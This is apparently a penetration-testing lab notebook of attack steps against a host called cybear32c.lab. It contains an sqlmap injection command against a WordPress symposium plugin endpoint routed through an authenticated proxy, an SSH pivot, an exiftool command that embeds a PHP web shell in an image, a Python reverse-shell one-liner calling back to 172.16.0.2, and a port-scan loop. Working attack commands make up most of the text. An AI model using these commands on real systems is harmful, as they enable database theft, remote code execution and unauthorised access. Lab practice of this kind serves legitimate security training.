http://cybear32c.lab/wp-content/plugins/wp-symposium/get_album_item.php

sudo sqlmap -u "http://cybear32c.lab/wp-content/plugins/wpsymposium/get_album_item.php?size=1" --dbs --proxy="http://192.168.101.8:3128" --proxy-cred="b.muncy:xxxx" --random-agent --level="4"

This broken down means:
-u "http://cybear32c.lab/wp-content/plugins/wpsymposium/get_album_item.php?size=1" - Use this URL as the injection point

--dbs - I don't know what the database is running so enumerate it for me.

--proxy="http://192.168.101.8:3128" - There is a proxy server so I need to specify it here

--proxy-cred="b.muncy:xxxx" - Use these creds to authenticate against

--random-agent - Use a random user agent

--level="4" - This tells SQLMap to use a larger amount of payloads against the target.

################

In order to connect to this box, I had to use the SSH box as my pivot point. In order to set this up I issued the following command:

ssh -L 80:192.168.0.6:80 d.nash@192.168.101.8

On my browser I had to change the proxy to:
127.0.0.1

###############

Attempt 3
I encoded a .jpeg and added a php one liner into the comments section with exiftool.

exiftool -Comment="<?php system($_GET['c']); ?>" up.jpeg

I tried renaming it to different extensions to get through the filtering up.php.<name>
This failed.
I wondered if the picture format was the issue

#############

I used the following Python code to generate my reverse shell:
#!/usr/bin/env python
# test-1
import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_
STREAM);s.connect(("172.16.0.2",4445));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

############

for p in <ports>; do nmap -Pn --max-retries 0 -p $p 127.0.0.1; done

























